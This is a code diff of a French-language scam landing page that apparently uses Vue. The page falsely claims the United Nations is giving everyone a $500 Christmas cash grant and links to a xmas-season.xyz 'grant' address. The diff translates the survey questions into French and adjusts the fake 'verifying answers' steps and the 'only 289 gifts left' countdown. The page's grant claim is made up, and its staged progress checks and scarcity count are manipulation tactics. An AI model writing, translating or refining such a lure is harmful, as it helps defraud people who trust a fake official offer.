@@ -341,14 +341,14 @@ D'accord
 
 
 <a href="https://www.xmas-season.xyz/500dollar-grant"><b><font color="red">FRENCH</font></b></a> | <a href="https://www.xmas-season.xyz/500dollar-grant"><b><font color="green">ENGLISH</font></b></a>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOBWfTILAYarH5zw7fBr6PyK_h7xS_gPN2OvEe6mY4n-tsSMIgmIFXLjKohQlGm1OFAK7nG3dQF8lc53PRKQzjDjRCqap0oANyl_nZenZwGhid7TYt_iySFi0q10aVkCeVObswEIo3dRlgMpAmoPs8KKn8UrRFpJhM60KCtXN2mkHp60ulP2C0BjxQI9A/s1080/Screenshot_20241126-143927.jpg" style="width:100%;" />
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkInameNo4oDX_03Gq-LPljVsMUpMXfNCUiyUpmlg0j_wdNsHPWG1W1vhxYbu8SGYa8pMAs_NOBBo9pZboEz1BJ9-GxyaI09WrGdlWFGkGuAxO85iWWCHycVF0eyUMNiWxUos_yCBYgTgwaEGweBEGX1HnqwaBNnodj4VYITvq8RtwP-rMi3J93Yjz2t42/s3072/CA8F25E6-AD8F-4745-AA87-5F4269CD3D7E.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
 Bonjour!
 </h1>
   <p class="paragraph">
-Bienvenue à, <b>SUBVENTION DE NOËL DE $500 DES NATIONS UNIES POUR TOUS</b>, pour célébrer Noël cette année, LA NATION UNIE distribue une subvention en espèces de $500 à tout le monde.
+Bienvenue à, <b>SUBVENTION DE NOËL DE 500 $ DES NATIONS UNIES POUR TOUS</b>, pour célébrer Noël cette année, LA NATION UNIE distribue une subvention en espèces de 500 $ à tout le monde.
 <br>
-Répondez aux questions ci-dessous pour réclamer <b>Prix ​​en argent de $500</b>
+Répondez aux questions ci-dessous pour réclamer <b>Prix ​​en argent de 500 $</b>
 </p>
   <br>
 </div>
@@ -365,8 +365,7 @@ Répondez aux questions ci-dessous pour réclamer <b>Prix ​​en argent de $50
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Vous avez répondu à 4/4 des questions
-</strong>
+Vous avez répondu à 4/4 des questions</strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
@@ -374,37 +373,39 @@ Vos réponses sont en cours de traitement<img class="verify__icon verify__icon--
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-encore des prix disponibles !
+encore des prix disponibles </strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+À la recherche de cadeaux.. 
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+Il ne reste que (289) cadeaux
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-A la recherche de cadeaux..<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
-</div>
-<div class="verify__text" v-if="rotateIndex > 3">
-<strong>
-Il ne reste que (289) cadeaux !</strong>
-<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
-</div>
-<div class="verify__text" v-else>
-Le stock est en cours de vérification<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Le stock est en cours de vérification
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Choose your continent",
+              title: "Choisissez votre continent",
               answers: [ { text: "African" }, { text: "European" } ]
             },
                                                              {
-              title: "Do you celebrate christmas in your country?",
+              title: "Fêtez-vous Noël dans votre pays ?",
               answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Choose your Gender?",
+              title: "Choisissez votre sexe ?",
               answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Select Your Age Range?",
+              title: "Sélectionnez votre tranche d'âge ?",
               answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
